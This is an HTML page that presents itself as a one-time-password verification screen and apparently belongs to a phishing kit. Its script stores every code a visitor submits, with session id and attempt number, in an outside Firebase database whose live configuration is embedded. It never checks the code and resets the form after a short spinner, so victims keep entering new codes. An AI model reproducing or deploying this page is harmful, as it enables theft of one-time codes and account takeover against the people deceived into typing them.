<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verify with One Time Password</title>
  <link rel="stylesheet" href="a02b572693328546.css">
  <style>
    .alert-attempt {
      text-align: center;
      font-weight: bold;
      margin: 10px 0;
      color: #007BFF; /* Blue color alert */
    }
    .spinner-container {
      text-align: center;
      margin-top: 20px;
    }
    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #007BFF;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <header>
    <img alt="Logo" class="logo" src="logo.png">
  </header>

  <main>
    <form id="otpForm">
      <h1>Verify with One Time Password</h1>
      <p>Your One Time Password has been sent to your registered mobile number.</p>

      <div class="floating-container">
        <input type="text" id="otp" minlength="6" maxlength="8" pattern="[0-9]+" inputmode="numeric" placeholder=" " required="">
        <label>One Time Password <span>*</span></label>
      </div>

      <div class="btContainer">
        <button type="submit">Submit</button>
      </div>

      <p>If you didn't receive the one-time password SMS, please click here to
        <a href="/a3#">resend</a>
      </p>

      <p style="font-weight: bold; text-align: center">OTP Expires: 03:00</p>

      <!-- Alert for attempt -->
      <div id="attemptAlert" class="alert-attempt" style="display:none;"></div>
    </form>

    <!-- Spinner -->
    <div id="spinnerContainer" class="spinner-container" style="display:none;">
      <div class="spinner"></div>
      <p>Please wait. Verifying Your Details...</p>
    </div>
  </main>

  <footer>
    <div class="l">
      <img alt="Sample" class="l" src="s.jpg">
    </div>
    <img alt="Footer" class="ft" src="ft.png">
  </footer>

  <script type="module">
    import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js';
    import { getFirestore, collection, addDoc, serverTimestamp, query, where, getDocs } from 'https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js';

    const firebaseConfig = {
      apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
      authDomain: "ss22-a96d3.firebaseapp.com",
      projectId: "ss22-a96d3",
      storageBucket: "ss22-a96d3.firebasestorage.app",
      messagingSenderId: "607942972170",
      appId: "1:607942972170:web:2e38b2d5410ff37f3960f3",
      measurementId: "G-KT1P0Q0FD0",
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const otpForm = document.getElementById('otpForm');
    const otpInput = document.getElementById('otp');
    const spinnerContainer = document.getElementById('spinnerContainer');
    const attemptAlert = document.getElementById('attemptAlert');

    // Read sessionId from localStorage
    const sessionId = localStorage.getItem("sessionId") || `session_${Date.now()}`;

    // Save sessionId in localStorage if not present
    if (!localStorage.getItem("sessionId")) localStorage.setItem("sessionId", sessionId);

    otpForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const otp = otpInput.value.trim();
      if (!otp) {
        alert('Please enter the OTP.');
        return;
      }

      try {
        // Get existing attempts count for this session
        const attemptsQuery = query(collection(db, 'otp_attempts'), where('sessionId', '==', sessionId));
        const querySnapshot = await getDocs(attemptsQuery);
        const attemptNumber = querySnapshot.size + 1;

        // Save OTP attempt in Firestore
        await addDoc(collection(db, 'otp_attempts'), {
          otp: otp,
          sessionId: sessionId,
          attemptNumber: attemptNumber,
          timestamp: serverTimestamp()
        });

        // Show alert with attempt number
        attemptAlert.textContent = `Attempt ${attemptNumber}`;
        attemptAlert.style.display = 'block';

        // Show spinner and reset page after 3 seconds
        otpForm.style.display = 'none';
        spinnerContainer.style.display = 'block';

        setTimeout(() => {
          otpInput.value = '';
          attemptAlert.style.display = 'none';
          spinnerContainer.style.display = 'none';
          otpForm.style.display = 'block';
        }, 3000);

      } catch (error) {
        console.error('Error saving OTP attempt:', error);
        alert('Failed to submit OTP. Please try again.');
      }
    });
  </script>
</body>
</html>